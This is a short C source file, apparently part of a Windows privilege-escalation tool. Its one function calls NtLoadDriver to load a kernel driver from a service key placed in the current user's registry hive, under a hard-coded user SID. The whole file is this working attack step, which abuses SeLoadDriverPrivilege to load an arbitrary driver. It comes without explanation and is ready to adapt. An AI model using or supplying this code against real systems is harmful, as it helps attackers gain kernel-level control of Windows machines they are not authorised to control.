#include "poptoke.h"

ULONG
LoadDriver()
{
	UNICODE_STRING DriverServiceName;
	ULONG dwErrorCode;
	NTSTATUS status;

	typedef NTSTATUS(_stdcall *NT_LOAD_DRIVER)(IN PUNICODE_STRING DriverServiceName);
	typedef void (WINAPI* RTL_INIT_UNICODE_STRING)(PUNICODE_STRING, PCWSTR);

	NT_LOAD_DRIVER NtLoadDriver = (NT_LOAD_DRIVER)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtLoadDriver");
	RTL_INIT_UNICODE_STRING RtlInitUnicodeString = (RTL_INIT_UNICODE_STRING)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");

	// this should reflect your user SID
	LPCWSTR win7regPath = L"\\Registry\\User\\S-1-5-21-3068013794-420640444-1099205789-1000\\System\\CurrentControlSet\\MRxDAV";

	RtlInitUnicodeString(&DriverServiceName, win7regPath);

	status = NtLoadDriver(&DriverServiceName);
	printf("NTSTATUS: %08x, WinError: %d\n", status, GetLastError());

	if (!NT_SUCCESS(status))
		return RtlNtStatusToDosError(status);

	return 0;
}